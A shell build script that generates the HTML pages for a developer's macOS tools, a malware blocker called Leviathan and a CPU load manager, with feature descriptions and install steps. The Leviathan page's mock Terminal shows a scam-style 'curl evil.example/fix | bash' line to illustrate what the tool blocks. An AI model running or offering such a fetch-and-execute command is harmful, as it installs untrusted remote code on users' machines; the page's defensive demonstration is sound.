#!/bin/bash
# Builds the three pages from shared header and footer.
cd "$(dirname "$0")"
H='<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT,WONK@9..144,300..600,0..100,0..1&family=IBM+Plex+Mono:wght@400;500&family=Instrument+Sans:wght@400;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="/style.css?v=6">'
TOP='<div class="wrap"><header class="top"><a class="name" href="/">Reed Ostrov</a><a class="mute mono" href="https://github.com/Questboy23">github &#8599;</a></header>'
FOOT='<footer><span>Reed Ostrov &middot; made in Ohio</span><span>free &amp; open source &middot; macOS</span></footer></div></body></html>'

cat > index.html <<EOF
$H<title>Reed Ostrov</title><meta name="description" content="Reed Ostrov's projects: free, open source tools for the Mac."></head><body>$TOP
<main class="home"><h1 class="label">Projects</h1><div class="grid">
<a class="card glass lev" href="/leviathan/"><span class="icon lev"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5l-8-3zm-1.2 14.2-3.5-3.5 1.4-1.4 2.1 2.1 4.9-4.9 1.4 1.4-6.3 6.3z"/></svg></span><h2>Leviathan</h2><p>Stops malware on your Mac before it runs.</p><span class="pill">Learn more &rarr;</span></a>
<a class="card glass am" href="/activity-monitored/"><span class="icon am"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 4a10 10 0 0 0-10 10c0 1.7.4 3.3 1.2 4.7l1.7-1A8 8 0 1 1 20 14c0 1.4-.4 2.7-1 3.8l1.7 1A10 10 0 0 0 12 4zm4.2 4.4-5.6 4.4a2 2 0 1 0 2.8 2.8l2.8-7.2z"/></svg></span><h2>Activity Monitored</h2><p>Keeps your Mac fast when it is overloaded.</p><span class="pill">Learn more &rarr;</span></a>
</div></main>$FOOT
EOF

cat > leviathan/index.html <<EOF
$H<title>Leviathan</title><meta name="description" content="Leviathan protects a Mac from malware sites, harmful downloads and dangerous pasted commands."></head><body>$TOP
<a class="back" href="/">&larr; all projects</a>
<section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--sea)"></i>Project 01 &middot; macOS &middot; v1.0</div><h1 class="serif" style="margin-top:16px">Leviathan</h1><p class="lede serif">It stops malware on your Mac before the malware can run.</p>
<div class="actions"><a class="btn" href="https://github.com/Questboy23/leviathan/releases/latest/download/Leviathan.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/leviathan">View the code</a></div></div>
<figure class="win" aria-label="Example of the paste guard"><div class="bar"><i></i><i></i><i></i><span>Terminal</span></div><pre class="scr"><span class="dim">$</span> curl -s evil.example/fix | bash
<b>Leviathan stopped this command.</b>
It downloads a program and runs it
straight away. Scam pages ask for this.
<span class="dim">Press Enter again to run it anyway.</span></pre></figure></section>

<section class="blk glass"><h3 class="serif">What it does</h3><div class="prose"><p>Most Mac infections start in one of three ways: a fake website, a file you download, or a command a scam page talks you into pasting into Terminal. Antivirus apps usually scan files after they arrive. Leviathan also stands guard at the other two doors.</p><p>It runs quietly in the background. After a one minute setup there is nothing to click and nothing to keep up to date. When it does step in, it tells you in plain words what it found and why, and it keeps a record so you can reverse the action later.</p></div></section>

<section class="blk glass"><h3 class="serif">How it works</h3><div class="prose feats">
<h4>1. Bad websites never load</h4><p>Every time your Mac looks up a website address, Leviathan checks it against two public lists of malware and phishing sites, refreshed every hour. Known bad addresses simply fail to load. Lookups travel encrypted to security focused services (Quad9 and Cloudflare), so your network provider cannot read them. Big shared sites such as Google Docs, Dropbox and GitHub are never blocked, even if one bad link is hosted there. If you join hotel or campus Wi-Fi with a sign-in page, it steps aside so you can log in.</p>
<h4>2. Harmful downloads get locked away</h4><p>New files in Downloads and new apps are checked with the same malware rules Apple ships in macOS, plus Apple&rsquo;s list of developers it has banned. A match moves to a locked folder where it cannot open. Nothing is deleted.</p>
<h4>3. Sneaky startup items get switched off</h4><p>Some malware hides by adding itself to the list of programs that start when you log in, often pretending to be part of macOS. Leviathan looks for those disguises and turns them off.</p>
<h4>4. Dangerous pasted commands get paused</h4><p>A popular scam shows a fake error and asks you to paste a line into Terminal to &ldquo;fix&rdquo; it. That line installs malware. Leviathan recognises these commands, stops them once and explains the risk. If you really meant it, pressing Enter again runs it.</p></div></section>

<section class="blk glass"><h3 class="serif">Why it&rsquo;s useful</h3><ul class="pros">
<li><span class="k">01</span><div><b>Covers the tricks antivirus misses</b><span>Fake sites and pasted commands are how most Mac malware spreads today.</span></div></li>
<li><span class="k">02</span><div><b>Every action can be undone</b><span>Each step is written to a tamper checked log, and <code>leviathan undo</code> puts any file or setting back.</span></div></li>
<li><span class="k">03</span><div><b>Private by design</b><span>No account, no tracking, and nothing about you is sent anywhere.</span></div></li>
<li><span class="k">04</span><div><b>Free forever</b><span>No subscription. The full source code is public.</span></div></li>
</ul></section>

<section class="blk glass"><h3 class="serif">How to install</h3><div><ol class="steps">
<li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above. Your Mac unzips it into Downloads.</span></div></li>
<li><span class="k">2</span><div><b>Open Terminal</b><span>Press Cmd and Space, type Terminal, press Return.</span></div></li>
<li><span class="k">3</span><div><b>Run the installer</b><span>Type <code>bash </code> with a space, drag <code>install.sh</code> from the unzipped folder into the window, and press Return. Enter your Mac password when asked; the website filter needs it once.</span></div></li>
</ol><p class="note">Or paste this single line into Terminal:</p><pre><code>cd ~ &amp;&amp; curl -fsSL https://github.com/Questboy23/leviathan/archive/refs/tags/v1.0.0.tar.gz | tar xz &amp;&amp; bash leviathan-1.0.0/install.sh</code></pre></div></section>
$FOOT
EOF

cat > activity-monitored/index.html <<EOF
$H<title>Activity Monitored</title><meta name="description" content="Activity Monitored keeps a Mac responsive when it is overloaded."></head><body>$TOP
<a class="back" href="/">&larr; all projects</a>
<section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--mustard)"></i>Project 02 &middot; macOS</div><h1 class="serif" style="margin-top:16px">Activity Monitored</h1><p class="lede serif">Keeps your Mac quick when too much is running at once.</p>
<div class="actions"><a class="btn" href="https://github.com/Questboy23/activity-monitored/archive/refs/heads/main.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/activity-monitored">View the code</a></div></div>
<figure class="win" aria-label="Example of Activity Monitored at work"><div class="bar"><i></i><i></i><i></i><span>Activity Monitored</span></div><pre class="scr">Processor  <span class="meter"><i style="width:96%"></i></span> 96%
<b>Busy. Asking 3 background programs to wait.</b>
  backup        lowered
  photo sync    lowered
  updater       lowered
<span class="dim">Back to normal in 90 seconds.</span></pre></figure></section>

<section class="blk glass"><h3 class="serif">What it does</h3><div class="prose"><p>Your Mac&rsquo;s processor can only do so much at once. When a backup, a photo sync and a software update all run together, they compete with the app you are actually using, and everything starts to stutter: typing lags, videos skip, windows beachball.</p><p>Activity Monitored watches for that moment. When the processor is overloaded, it gently lowers the priority of the busy programs running in the background. They keep working, just a little more politely, and the window in front of you stays smooth. Once things calm down, every program goes back to normal.</p></div></section>

<section class="blk glass"><h3 class="serif">How it works</h3><div class="prose feats">
<h4>1. It watches the load</h4><p>Every 3 seconds it checks how hard the processor is working and which programs are using it most. If there is spare room, it does nothing at all.</p>
<h4>2. It lowers busy background programs</h4><p>When the Mac is overloaded, it moves the heaviest background programs to macOS&rsquo;s low priority lane, the same one macOS uses for its own background chores. Nothing is closed or paused, and no work is lost.</p>
<h4>3. It always puts things back</h4><p>Every change starts its own 90 second timer that reverses it automatically. The timer runs separately, so even if Activity Monitored crashes or you remove it, your programs still return to normal. Every change is also written to a log you can read.</p></div></section>

<section class="blk glass"><h3 class="serif">Why it&rsquo;s useful</h3><ul class="pros">
<li><span class="k">01</span><div><b>The app you&rsquo;re using stays smooth</b><span>Typing, scrolling and video keep up even while heavy work runs behind them.</span></div></li>
<li><span class="k">02</span><div><b>Heavy jobs can even finish sooner</b><span>In one overload test on one Mac, a 10 program job finished in 24 seconds instead of 39.</span></div></li>
<li><span class="k">03</span><div><b>Nothing is ever closed</b><span>Programs are only slowed for a moment. They keep running and keep their work.</span></div></li>
<li><span class="k">04</span><div><b>Free, private, no account</b><span>No subscription, no sign up, and no data leaves your Mac.</span></div></li>
</ul></section>

<section class="blk glass"><h3 class="serif">How to install</h3><div><ol class="steps">
<li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above. Your Mac unzips it into Downloads.</span></div></li>
<li><span class="k">2</span><div><b>Open the installer</b><span>In the unzipped folder, right click <code>Install Activity Monitored.command</code> and choose Open.</span></div></li>
<li><span class="k">3</span><div><b>That&rsquo;s it</b><span>It starts now and every time you log in. If your Mac offers to install developer tools, click Install, then repeat step 2.</span></div></li>
</ol><p class="note">Or paste this single line into Terminal:</p><pre><code>curl -fsSL https://raw.githubusercontent.com/Questboy23/activity-monitored/main/install.sh | bash</code></pre></div></section>
$FOOT
EOF
